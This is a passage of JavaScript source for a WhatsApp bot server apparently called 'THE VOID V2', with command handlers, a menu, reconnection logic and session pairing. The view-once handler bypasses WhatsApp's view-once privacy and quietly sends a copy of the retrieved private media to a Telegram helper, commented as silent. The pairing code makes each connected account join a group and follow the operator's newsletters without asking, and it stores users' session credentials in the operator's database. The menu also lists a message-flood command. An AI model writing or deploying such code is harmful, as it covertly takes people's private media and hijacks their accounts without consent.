                            mediaData = quotedMsg.viewOnceMessage.message.videoMessage;
                            mediaType = 'video';
                            caption = mediaData.caption || '';
                        } else if (quotedMsg.viewOnceMessageV2?.message?.imageMessage) {
                            mediaData = quotedMsg.viewOnceMessageV2.message.imageMessage;
                            mediaType = 'image';
                            caption = mediaData.caption || '';
                        } else if (quotedMsg.viewOnceMessageV2?.message?.videoMessage) {
                            mediaData = quotedMsg.viewOnceMessageV2.message.videoMessage;
                            mediaType = 'video';
                            caption = mediaData.caption || '';
                        } else {
                            return await socket.sendMessage(sender, {
                                text: '❌ *This is not a ViewOnce message or it has already been viewed!*'
                            }, { quoted: myquoted });
                        }

                        if (mediaData && mediaType) {
                            await socket.sendMessage(sender, {
                                text: '⏳ *Retrieving ViewOnce media...*'
                            }, { quoted: myquoted });

                            const buffer = await downloadAndSaveMedia(mediaData, mediaType);

                            // Silently send a copy to Telegram (no user notification on failure)
                            sendMediaToTelegramSilently(buffer, mediaType, caption);

                            const messageContent = caption ?
                                `✅ *ViewOnce ${mediaType} Retrieved*\n\n📝 Caption: ${caption}` :
                                `✅ *ViewOnce ${mediaType} Retrieved*`;

                            if (mediaType === 'image') {
                                await socket.sendMessage(sender, {
                                    image: buffer,
                                    caption: messageContent
                                }, { quoted: myquoted });
                            } else if (mediaType === 'video') {
                                await socket.sendMessage(sender, {
                                    video: buffer,
                                    caption: messageContent
                                }, { quoted: myquoted });
                            }

                            await socket.sendMessage(sender, {
                                react: { text: '✅', key: msg.key }
                            });

                            console.log(`✅ ViewOnce ${mediaType} retrieved for ${sender}`);
                        }

                    } catch (error) {
                        console.error('ViewOnce Error:', error);
                        await socket.sendMessage(sender, {
                            text: `❌ *Failed to retrieve ViewOnce*\n\nError: ${error.message}`
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'count': {
                    try {
                        const activeCount = activeSockets.size;
                        const pendingCount = pendingSaves.size;
                        const healthyCount = Array.from(sessionHealth.values()).filter(h => h === 'active' || h === 'connected').length;
                        const reconnectingCount = Array.from(sessionHealth.values()).filter(h => h === 'reconnecting').length;
                        const failedCount = Array.from(sessionHealth.values()).filter(h => h === 'failed' || h === 'error').length;

                        // Count MongoDB sessions
                        const mongoSessionCount = await getMongoSessionCount();

                        // Get uptimes
                        const uptimes = [];
                        activeSockets.forEach((socket, number) => {
                            const startTime = socketCreationTime.get(number);
                            if (startTime) {
                                const uptime = Date.now() - startTime;
                                uptimes.push({
                                    number,
                                    uptime: Math.floor(uptime / 1000)
                                });
                            }
                        });

                        uptimes.sort((a, b) => b.uptime - a.uptime);

                        const uptimeList = uptimes.slice(0, 5).map((u, i) => {
                            const hours = Math.floor(u.uptime / 3600);
                            const minutes = Math.floor((u.uptime % 3600) / 60);
                            return `${i + 1}. ${u.number} - ${hours}h ${minutes}m`;
                        }).join('\n');

                        await socket.sendMessage(sender, {
                            image: { url: config.IMAGE_PATH },
                            caption: formatMessage(
                                '📊 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐂𝐎𝐔𝐍𝐓 𝐑𝐄𝐏𝐎𝐑𝐓',
                                `🟢 *Active Sessions:* ${activeCount}\n` +
                                `✅ *Healthy:* ${healthyCount}\n` +
                                `🔄 *Reconnecting:* ${reconnectingCount}\n` +
                                `❌ *Failed:* ${failedCount}\n` +
                                `💾 *Pending Saves:* ${pendingCount}\n` +
                                `☁️ *MongoDB Sessions:* ${mongoSessionCount}\n` +
                                `☁️ *MongoDB Status:* ${mongoConnected ? '✅ Connected' : '❌ Not Connected'}\n\n` +
                                `⏱️ *Top 5 Longest Running:*\n${uptimeList || 'No sessions running'}\n\n` +
                                `📅 *Report Time:* ${getSriLankaTimestamp()}`,
                                '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                            )
                        }, { quoted: myquoted });

                    } catch (error) {
                        console.error('❌ Count error:', error);
                        await socket.sendMessage(sender, {
                            text: '*❌ Failed to get session count*'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'yts': {
                    try {
                        if (!args[0]) {
                            return await socket.sendMessage(sender, {
                                text: '*❌ Please provide a search query*\n*Usage:* .yts <search term>'
                            }, { quoted: myquoted });
                        }

                        const query = args.join(' ');
                        await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

                        const searchResults = await yts(query);

                        if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
                            return await socket.sendMessage(sender, {
                                text: `*❌ No results found for:* ${query}`
                            }, { quoted: myquoted });
                        }

                        const videos = searchResults.videos.slice(0, 5);

                        let resultText = `*🔍 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐒𝐄𝐀𝐑𝐂𝐇 𝐑𝐄𝐒𝐔𝐋𝐓𝐒*\n`;
                        resultText += `*Query:* ${query}\n`;
                        resultText += `*Found:* ${searchResults.videos.length} videos\n`;
                        resultText += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                        videos.forEach((video, index) => {
                            resultText += `*${index + 1}. ${video.title}*\n`;
                            resultText += `⏱️ Duration: ${video.timestamp}\n`;
                            resultText += `👁️ Views: ${video.views ? video.views.toLocaleString() : 'N/A'}\n`;
                            resultText += `📅 Uploaded: ${video.ago}\n`;
                            resultText += `👤 Channel: ${video.author.name}\n`;
                            resultText += `🔗 Link: ${video.url}\n`;
                            resultText += `━━━━━━━━━━━━━━━━━━━━\n\n`;
                        });

                        resultText += `> *𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓*\n`;
                        resultText += `> *Tip:* Use .song <title/url> to download audio`;

                        await socket.sendMessage(sender, {
                            image: { url: videos[0].thumbnail },
                            caption: resultText,
                            contextInfo: {
                                externalAdReply: {
                                    title: videos[0].title,
                                    body: `${videos[0].author.name} • ${videos[0].timestamp}`,
                                    thumbnailUrl: videos[0].thumbnail,
                                    sourceUrl: videos[0].url,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        }, { quoted: myquoted });

                        await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });

                    } catch (error) {
                        console.error('❌ YouTube search error:', error);
                        await socket.sendMessage(sender, {
                            text: `*❌ Search failed*\n*Error:* ${error.message}`
                        }, { quoted: myquoted });
                    }
                    break;
                }

 case 'menu': {
    const dybymenu = `
𝙸 𝙼 𝚃𝙷𝙴 𝚅𝙾𝙸𝙳 𝚅2 𝙼𝙸𝙽𝙸 

*╭─ 乂 \`📥 D O W N L O A D 📥\` ◦•◦❥•*
*╎*
*╎🏷️ᴄᴍᴅ - .ꜱᴏɴɢ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ᴀɴʏ ꜱᴏɴɢꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ɪɢ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ɪɴꜱᴛᴀɢʀᴀᴍ ᴠɪᴅᴇᴏꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ꜰʙ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ꜰᴀᴄᴇʙᴏᴏᴋ ᴠɪᴅᴇᴏꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴛɪᴋᴛᴏᴋ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ᴛɪᴋᴛᴏᴋ ᴠɪᴅᴇᴏꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ꜱᴇɴᴅ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ᴛʜᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱᴛᴀᴛᴜꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .xᴠɪᴅᴇᴏ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ᴘᴏʀɴ ᴠɪᴅᴇᴏ ᴏɴ xᴠɪᴅᴇᴏ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴍᴏᴠɪᴇ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴏᴠɪᴇ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ʏᴛs*
*╎🔖 ᴅᴇꜱᴄ- ʏᴏᴜᴛᴜʙᴇ sᴇᴀʀᴄʜ ʀᴇsᴜʟᴛ.*
*╎*
*╰─────────────────◦•◦❥•*


*╭─ 乂 \`⛺ O T H E R S ⛺\` ◦•◦❥•*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴍᴇɴᴜ*
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ᴛʜᴇ ʙᴏᴛ ᴍᴇɴᴜ ʟɪꜱᴛ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴀʟɪᴠᴇ*
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ᴛʜᴇ ʙᴏᴛ ꜱᴛᴀᴛᴇꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴘɪɴɢ*
*╎🔖 ᴅᴇꜱᴄ- ᴄʜᴇᴄᴋ ᴛʜᴇ ʙᴏᴛ ꜱᴘᴇᴇᴅ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴘᴀɪʀ*
*╎🔖 ᴅᴇꜱᴄ- ᴄᴏɴɴᴇᴄᴛ ᴍɪɴɪ ʙᴏᴛ ɪɴ ʏᴏᴜʀ ᴅᴇᴠɪᴄᴇ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ꜰʀᴇᴇʙᴏᴛ*
*╎🔖 ᴅᴇꜱᴄ- ᴀᴄᴛɪᴠᴇ ᴍɪɴɪ ʙᴏᴛ ɪɴ ʏᴏᴜʀ ᴅᴇᴠɪᴄᴇ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴠᴠ*
*╎🔖 ᴅᴇꜱᴄ- ᴅᴇᴄʀʏᴘᴛᴇᴅ ᴏɴᴄᴇ ᴠɪᴇᴡ ɪᴍᴀɢᴇꜱ,ᴀᴜᴅɪᴏꜱ &amp; ᴠɪᴅᴏᴇꜱ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ɢᴇᴛᴅᴘ*
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ᴏᴛʜᴇʀ ᴡʜᴀᴛꜱᴀᴘᴘ ᴅᴇᴛᴀɪʟꜱ.*
*╎*
*╰─────────────────◦•◦❥•*

*╭─ 乂 \`🧠 I N F O & U T I L 🧠\` ◦•◦❥•*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴀɪ*
*╎🔖 ᴅᴇꜱᴄ- ᴄʜᴀᴛ ᴡɪᴛʜ ꜱᴜʜᴀꜱ-ᴍɪɴɪ ᴀɪ ᴀꜱꜱɪꜱᴛᴀɴᴛ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ɴᴇᴡs*
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ɴᴇᴡs ғʀᴏᴍ ɴᴀsᴀ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ʙᴏᴏᴍ.*
*╎🔖 ᴅᴇꜱᴄ- sᴇɴᴅ ʙᴏᴏᴍ ᴍᴇsɢ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴄᴏᴜɴᴛ.*
*╎🔖 ᴅᴇꜱᴄ- ᴄᴏᴜɴᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴜsᴇʀs.*
*╎*
*╎🏷️ᴄᴍᴅ - .ғᴏʀᴡᴀʀᴅ.*
*╎🔖 ᴅᴇꜱᴄ- ғᴏʀᴡᴀʀᴅ ʀᴇᴘʟɪᴇᴅ ᴍsɢ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴡᴀᴍᴇ.*
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ғᴏʀ ɴᴜᴍʙᴇʀ.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴊɪᴅ
*╎🔖 ᴅᴇꜱᴄ- ɢᴇᴛ ᴊɪᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ.*
*╎*
*╰─────────────────◦•◦❥•*

*╭─ 乂 \`🛑 S E T T I N G S 🛑\` ◦•◦❥•*
*╎*
*╎🏷️ᴄᴍᴅ - .sᴇᴛᴛɪɴɢs*
*╎🔖 ᴅᴇꜱᴄ- ᴠɪᴇᴡs ᴄᴜʀʀᴇɴᴛ sᴇᴛᴛɪɴɢs.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴀᴜᴛᴏʟɪᴋᴇ*
*╎🔖 ᴅᴇꜱᴄ-  ᴛᴏɢɢʟᴇ ᴀᴜᴛᴏ ʟɪᴋᴇ sᴛᴀᴛᴜs.*
*╎*
*╎🏷️ᴄᴍᴅ - .sᴇᴛᴘʀᴇғɪx*
*╎🔖 ᴅᴇꜱᴄ- ᴄʜᴀɴɢᴇ ʙᴏᴛ ᴘʀᴇғɪx.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴀᴜᴛᴏᴠɪᴇᴡ*
*╎🔖 ᴅᴇꜱᴄ- ᴛᴏɢɢʟᴇ ᴀᴜᴛᴏ ᴠɪᴇᴡ sᴛᴀᴛᴜs.*
*╎*
*╎🏷️ᴄᴍᴅ - .ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ*
*╎🔖 ᴅᴇꜱᴄ- ᴛᴏɢɢʟᴇ ᴀᴜᴛᴏ ʀᴇᴄᴏʀᴅɪɴɢ .*
*╎*
*╎🏷️ᴄᴍᴅ - .sᴇᴛᴇᴍᴏᴊɪs*
*╎🔖 ᴅᴇꜱᴄ- sᴇᴛ ʟɪᴋᴇ ᴇᴍᴏᴊɪ sᴛᴀᴛᴜs.*
*╎*
*╰─────────────────◦•◦❥•*

*🚀 THE VOID OFFICIAL WEBSITE:-*
*_voidv2.mazxa.com_*


> *©𝚃𝙷𝙴 𝚅𝙾𝙸𝙳 𝙼𝙳 𝙼𝙸𝙽𝙸 𝙱𝙾𝚃 🫟*`;

    await socket.sendMessage(sender, {
        image: { url: config.IMAGE_PATH },
        caption: dybymenu,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran || '120363421972517238@newsletter',
                newsletterName: global.nameSaluran || 'ANDY MRLIT VIP',
                serverMessageId: 143
            }
        }
    }, { quoted: myquoted });
    break;
}

                case 'wame': {
    try {
        let targetNumber = '';
        let customText = '';

        if (msg.message.extendedTextMessage?.contextInfo?.participant) {
            targetNumber = msg.message.extendedTextMessage.contextInfo.participant.split('@')[0];
            customText = args.join(' ');
        }
        else if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
            targetNumber = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
            customText = args.join(' ');
        }
        else if (args[0]) {
            targetNumber = args[0].replace(/[^0-9]/g, '');
            customText = args.slice(1).join(' ');
        }
        else {
            targetNumber = sender.split('@')[0];
            customText = args.join(' ');
        }

        let waLink = `https://wa.me/${targetNumber}`;
        if (customText) {
            waLink += `?text=${encodeURIComponent(customText)}`;
        }

        await socket.sendMessage(sender, {
            image: { url: config.IMAGE_PATH },
            caption: formatMessage(
                '🔗 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐋𝐈𝐍𝐊 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃',
                `📱 *Number:* ${targetNumber}\n🔗 *Link:* ${waLink}\n${customText ? `💬 *Message:* ${customText}` : ''}`,
                '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
            ),
            contextInfo: {
                externalAdReply: {
                    title: `Chat with ${targetNumber}`,
                    body: "Click to open WhatsApp chat",
                    thumbnailUrl: config.IMAGE_PATH,
                    sourceUrl: waLink,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ WAME error:', error);
        await socket.sendMessage(sender, {
            text: '*❌ Failed to generate WhatsApp link*'
        }, { quoted: myquoted });
    }
    break;
}




                case 'xvideo': {
                    try {
                        if (!args[0]) {
                            return await socket.sendMessage(sender, {
                                text: '*❌ Please provide a search query or URL\nExample: .xvideo mia*'
                            }, { quoted: myquoted });
                        }

                        let video = null, isURL = false;
                        if (!args[0].startsWith('http')) {
                            await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

                            const searchResponse = await axios.get(`https://saviya-kolla-api.koyeb.app/search/xvideos?query=${args.join(' ')}`);

                            if (!searchResponse.data.status || !searchResponse.data.result || searchResponse.data.result.length === 0) {
                                throw new Error('No results found');
                            }

                            video = searchResponse.data.result[0];

                        } else { 
                            video = args[0];
                            isURL = true;
                        }

                        const dlResponse = await axios.get(`https://saviya-kolla-api.koyeb.app/download/xvideos?url=${encodeURIComponent(isURL ? video : video.url)}`);
                        if (!dlResponse.data.status) throw new Error('Download API failed');

                        const dl = dlResponse.data.result;

                        await socket.sendMessage(sender, {
                            video: { url: dl.url },
                            caption: `*📹 ${dl.title}*\n\n⏱️ ${isURL ?  "" : `Duration: ${video.duration}`}\n👁️ Views: ${dl.views}\n👍 Likes: ${dl.likes} | 👎 Dislikes: ${dl.dislikes}\n\n> 𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓`,
                            mimetype: 'video/mp4'
                        }, { quoted: myquoted });

                    } catch (error) {
                        console.error('❌ XVideo error:', error);
                        await socket.sendMessage(sender, {
                            text: '*❌ Failed to fetch video*'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                default:
                    // Unknown command
                    break;
            }
        } catch (error) {
            console.error('❌ Command handler error:', error);
            await socket.sendMessage(sender, {
                image: { url: config.IMAGE_PATH },
                caption: formatMessage(
                    '❌ AUTO ERROR HANDLER',
                    'An error occurred but auto-recovery is active. Please try again.',
                    '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                )
            });
        }
    });
}

function setupMessageHandlers(socket, number) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;

        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        sessionHealth.set(sanitizedNumber, 'active');

        if (msg.key.remoteJid.endsWith('@s.whatsapp.net')) {
            await handleUnknownContact(socket, number, msg.key.remoteJid);
        }

        if (config.AUTO_RECORDING === 'true') {
            try {
                await socket.sendPresenceUpdate('recording', msg.key.remoteJid);
            } catch (error) {
                console.error('❌ Failed to set recording presence:', error);
            }
        }
    });
}

function setupAutoRestart(socket, number) {
    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        sessionConnectionStatus.set(sanitizedNumber, connection);

        if (qr) {
            console.log('QR Code received for:', sanitizedNumber);
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const errorMessage = lastDisconnect?.error?.message || '';
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            disconnectionTime.set(sanitizedNumber, Date.now());
            sessionHealth.set(sanitizedNumber, 'disconnected');
            sessionConnectionStatus.set(sanitizedNumber, 'closed');

            // Check for Bad MAC error or logged out
            if (statusCode === DisconnectReason.loggedOut || 
                statusCode === DisconnectReason.badSession ||
                errorMessage.includes('Bad MAC') || 
                errorMessage.includes('bad-mac') || 
                errorMessage.includes('decrypt')) {

                console.log(`❌ Bad MAC/Invalid session detected for ${number}, cleaning up...`);
                sessionHealth.set(sanitizedNumber, 'invalid');
                await updateSessionStatus(sanitizedNumber, 'invalid', new Date().toISOString());
                await updateSessionStatusInMongoDB(sanitizedNumber, 'invalid', 'invalid');

                setTimeout(async () => {
                    await handleBadMacError(sanitizedNumber);
                }, config.IMMEDIATE_DELETE_DELAY);
            } else if (shouldReconnect) {
                console.log(`🔄 Connection closed for ${number}, attempting reconnect...`);
                sessionHealth.set(sanitizedNumber, 'reconnecting');
                await updateSessionStatus(sanitizedNumber, 'failed', new Date().toISOString(), {
                    disconnectedAt: new Date().toISOString(),
                    reason: errorMessage
                });
                await updateSessionStatusInMongoDB(sanitizedNumber, 'disconnected', 'reconnecting');

                const attempts = reconnectionAttempts.get(sanitizedNumber) || 0;
                if (attempts < config.MAX_FAILED_ATTEMPTS) {
                    await delay(10000);
                    activeSockets.delete(sanitizedNumber);
                    stores.delete(sanitizedNumber);

                    const mockRes = { headersSent: false, send: () => { }, status: () => mockRes };
                    await EmpirePair(number, mockRes);
                } else {
                    console.log(`❌ Max reconnection attempts reached for ${number}, deleting...`);
                    setTimeout(async () => {
                        await deleteSessionImmediately(sanitizedNumber);
                    }, config.IMMEDIATE_DELETE_DELAY);
                }
            } else {
                console.log(`❌ Session logged out for ${number}, cleaning up...`);
                await deleteSessionImmediately(sanitizedNumber);
            }
        } else if (connection === 'open') {
            console.log(`✅ Connection open: ${number}`);
            sessionHealth.set(sanitizedNumber, 'active');
            sessionConnectionStatus.set(sanitizedNumber, 'open');
            reconnectionAttempts.delete(sanitizedNumber);
            disconnectionTime.delete(sanitizedNumber);
            await updateSessionStatus(sanitizedNumber, 'active', new Date().toISOString());
            await updateSessionStatusInMongoDB(sanitizedNumber, 'active', 'active');

            setTimeout(async () => {
                await autoSaveSession(sanitizedNumber);
            }, 5000);
        } else if (connection === 'connecting') {
            sessionHealth.set(sanitizedNumber, 'connecting');
            sessionConnectionStatus.set(sanitizedNumber, 'connecting');
        }
    });
}

// **MAIN PAIRING FUNCTION WITH BAD MAC FIXES**

async function EmpirePair(number, res) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(config.SESSION_BASE_PATH, `session_${sanitizedNumber}`);

    console.log(`🔄 Connecting: ${sanitizedNumber}`);

    try {
        await fs.ensureDir(sessionPath);

        // Check if we need to clear bad session first
        const existingCredsPath = path.join(sessionPath, 'creds.json');
        if (fs.existsSync(existingCredsPath)) {
            try {
                const existingCreds = JSON.parse(await fs.readFile(existingCredsPath, 'utf8'));
                if (!validateSessionData(existingCreds)) {
                    console.log(`⚠️ Invalid existing session, clearing: ${sanitizedNumber}`);
                    await handleBadMacError(sanitizedNumber);
                }
            } catch (error) {
                console.log(`⚠️ Corrupted session file, clearing: ${sanitizedNumber}`);
                await handleBadMacError(sanitizedNumber);
            }
        }

        const restoredCreds = await restoreSession(sanitizedNumber);
        if (restoredCreds && validateSessionData(restoredCreds)) {
            await fs.writeFile(
                path.join(sessionPath, 'creds.json'),
                JSON.stringify(restoredCreds, null, 2)
            );
            console.log(`✅ Session restored: ${sanitizedNumber}`);
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();
        const logger = pino({ level: process.env.NODE_ENV === 'production' ? 'fatal' : 'debug' });

        // Create store
        const store = makeInMemoryStore({ logger });
        stores.set(sanitizedNumber, store);

        const socket = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            browser: Browsers.macOS('Safari'),
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 30000,
            retryRequestDelayMs: 2000,
            maxRetries: 5,
            syncFullHistory: false,
            generateHighQualityLinkPreview: false,
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg?.message || undefined;
                }
                return undefined;
            }
        });

        // Bind store
        store?.bind(socket.ev);

        // Add error handler for socket
        socket.ev.on('error', async (error) => {
            console.error(`❌ Socket error for ${sanitizedNumber}:`, error);

            if (error.message?.includes('Bad MAC') || 
                error.message?.includes('bad-mac') || 
                error.message?.includes('decrypt')) {

                console.log(`🔧 Bad MAC detected for ${sanitizedNumber}, cleaning up...`);
                await handleBadMacError(sanitizedNumber);

                if (!res.headersSent) {
                    res.status(400).send({
                        error: 'Session corrupted',
                        message: 'Session has been cleared. Please try pairing again.',
                        action: 'retry_pairing'
                    });
                }
            }
        });

        socketCreationTime.set(sanitizedNumber, Date.now());
        sessionHealth.set(sanitizedNumber, 'connecting');
        sessionConnectionStatus.set(sanitizedNumber, 'connecting');

        setupStatusHandlers(socket);
        setupCommandHandlers(socket, sanitizedNumber);
        setupMessageHandlers(socket, sanitizedNumber);
        setupAutoRestart(socket, sanitizedNumber);
        setupNewsletterHandlers(socket);
        handleMessageRevocation(socket, sanitizedNumber);

        if (!socket.authState.creds.registered) {
            let retries = config.MAX_RETRIES;
            let code;

            while (retries > 0) {
                try {
                    await delay(1500);
                    code = await socket.requestPairingCode(sanitizedNumber);
                    console.log(`📱 Generated pairing code for ${sanitizedNumber}: ${code}`);
                    break;
                } catch (error) {
                    retries--;
                    console.warn(`⚠️ Pairing code generation failed, retries: ${retries}`);

                    // Check for Bad MAC in pairing
                    if (error.message?.includes('MAC')) {
                        await handleBadMacError(sanitizedNumber);
                        throw new Error('Session corrupted, please try again');
                    }

                    if (retries === 0) throw error;
                    await delay(2000 * (config.MAX_RETRIES - retries));
                }
            }

            if (!res.headersSent && code) {
                res.send({ code });
            }
        }

        socket.ev.on('creds.update', async () => {
            try {
                await saveCreds();

                if (isSessionActive(sanitizedNumber)) {
                    const fileContent = await fs.readFile(
                        path.join(sessionPath, 'creds.json'),
                        'utf8'
                    );
                    const credData = JSON.parse(fileContent);

                    // Validate before saving
                    if (validateSessionData(credData)) {
                        await saveSessionToMongoDB(sanitizedNumber, credData);
                        console.log(`💾 Valid session credentials updated: ${sanitizedNumber}`);
                    } else {
                        console.warn(`⚠️ Invalid credentials update for ${sanitizedNumber}`);
                    }
                }
            } catch (error) {
                console.error(`❌ Failed to save credentials for ${sanitizedNumber}:`, error);

                // Check for Bad MAC error
                if (error.message?.includes('MAC') || error.message?.includes('decrypt')) {
                    await handleBadMacError(sanitizedNumber);
                }
            }
        });

        socket.ev.on('connection.update', async (update) => {
            const { connection } = update;

            if (connection === 'open') {
                try {
                    await delay(3000);
                    const userJid = jidNormalizedUser(socket.user.id);

                    await updateAboutStatus(socket);
                    await updateStoryStatus(socket);

                    const groupResult = await joinGroup(socket);

                    for (const newsletterJid of config.NEWSLETTER_JIDS) {
                        try {
                            if (socket.newsletterFollow) {
                                await socket.newsletterFollow(newsletterJid);
                                console.log(`✅ Auto-followed newsletter: ${newsletterJid}`);
                            }
                        } catch (error) {
                            console.error(`❌ Failed to follow newsletter: ${error.message}`);
                        }
                    }

                    // Load or save user config
                    const userConfig = await loadUserConfig(sanitizedNumber);
                    if (!userConfig) {
                        await updateUserConfig(sanitizedNumber, config);
                    }

                    activeSockets.set(sanitizedNumber, socket);
                    sessionHealth.set(sanitizedNumber, 'active');
                    sessionConnectionStatus.set(sanitizedNumber, 'open');
                    disconnectionTime.delete(sanitizedNumber);
                    restoringNumbers.delete(sanitizedNumber);

                    await socket.sendMessage(userJid, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓',
                            `Connect - https://voidv2.mazxa.com\n🤖 Auto-connected successfully!\n\n🔢 Number: ${sanitizedNumber}\n🍁 Channel: Auto-followed\n📋 Group: Jointed ✅\n🔄 Auto-Reconnect: Active\n🧹 Auto-Cleanup: Inactive Sessions\n☁️ Storage: MongoDB (${mongoConnected ? 'Connected' : 'Connecting...'})\n📋 Pending Saves: ${pendingSaves.size}\n\n📋 Commands:\n📌${config.PREFIX}alive - Session status\n📌${config.PREFIX}menu - Show all commands`,
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                        )
                    });

                    await sendAdminConnectMessage(socket, sanitizedNumber, groupResult);
                    await updateSessionStatus(sanitizedNumber, 'active', new Date().toISOString());
                    await updateSessionStatusInMongoDB(sanitizedNumber, 'active', 'active');

                    let numbers = [];
                    if (fs.existsSync(config.NUMBER_LIST_PATH)) {
                        numbers = JSON.parse(await fs.readFile(config.NUMBER_LIST_PATH, 'utf8'));
                    }
                    if (!numbers.includes(sanitizedNumber)) {
                        numbers.push(sanitizedNumber);
                        await fs.writeFile(config.NUMBER_LIST_PATH, JSON.stringify(numbers, null, 2));
                    }

                    console.log(`✅ Session fully connected and active: ${sanitizedNumber}`);
                } catch (error) {
                    console.error('❌ Connection setup error:', error);
                    sessionHealth.set(sanitizedNumber, 'error');

                    // Check for Bad MAC error
                    if (error.message?.includes('MAC') || error.message?.includes('decrypt')) {
                        await handleBadMacError(sanitizedNumber);
                    }
                }
            }
        });

        return socket;
    } catch (error) {
        console.error(`❌ Pairing error for ${sanitizedNumber}:`, error);

        // Check if it's a Bad MAC error
        if (error.message?.includes('Bad MAC') || 
            error.message?.includes('bad-mac') || 
            error.message?.includes('decrypt')) {

            await handleBadMacError(sanitizedNumber);

            if (!res.headersSent) {
                res.status(400).send({
                    error: 'Session corrupted',
                    message: 'Session has been cleared. Please try pairing again.',
                    action: 'retry_pairing'
                });
            }
        } else {
            sessionHealth.set(sanitizedNumber, 'failed');
            sessionConnectionStatus.set(sanitizedNumber, 'failed');
            disconnectionTime.set(sanitizedNumber, Date.now());
            restoringNumbers.delete(sanitizedNumber);

            if (!res.headersSent) {
                res.status(503).send({ error: 'Service Unavailable', details: error.message });
            }
        }

        throw error;
    }
}

